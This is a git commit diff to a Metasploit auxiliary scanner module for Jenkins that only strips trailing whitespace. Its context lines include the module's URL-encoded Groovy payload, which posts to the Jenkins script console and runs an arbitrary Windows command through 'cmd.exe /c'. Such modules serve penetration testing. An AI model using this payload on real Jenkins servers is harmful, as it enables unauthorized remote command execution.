284edbe4b0244ee715835162dff1c6b8e586f11f
altjx <alton.jx@gmail.com>
2015-09-02 16:47:23 -0400

    Update jenkins_command.rb

--- modules/auxiliary/scanner/http/jenkins_command.rb
+++ modules/auxiliary/scanner/http/jenkins_command.rb
@@ -30,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
              'Jeffrey Cap'
         ],
       'References'  => [
-        ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/'] 
+        ['URL', 'https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password/']
        ],
       'License'     => MSF_LICENSE
       ))
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
       'ctype'     => 'application/x-www-form-urlencoded',
       'data'      => "script=def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%0D%0Adef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%0D%0Aproc.consumeProcessOutput%28sout%2C+serr%29%0D%0Aproc.waitForOrKill%281000%29%0D%0Aprintln+%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%22%0D%0A&json=%7B%22script%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%5Cnproc.waitForOrKill%281000%29%5Cnprintln+%5C%22out%26gt%3B+%24sout+err%26gt%3B+%24serr%5C%22%5Cn%22%2C+%22%22%3A+%22def+sout+%3D+new+StringBuffer%28%29%2C+serr+%3D+new+StringBuffer%28%29%5Cndef+proc+%3D+%27cmd.exe+%2Fc+#{command}%27.execute%28%29%5Cnproc.consumeProcessOutput%28sout%2C+serr%29%22%7D&Submit=Run"
     }).body.to_s
-     
+
     unless res.nil?
       output = res.scan(/<pre>(.*?)<\/pre>/m)[1][0][12..-1].gsub("err&amp;gt;", "")
     end
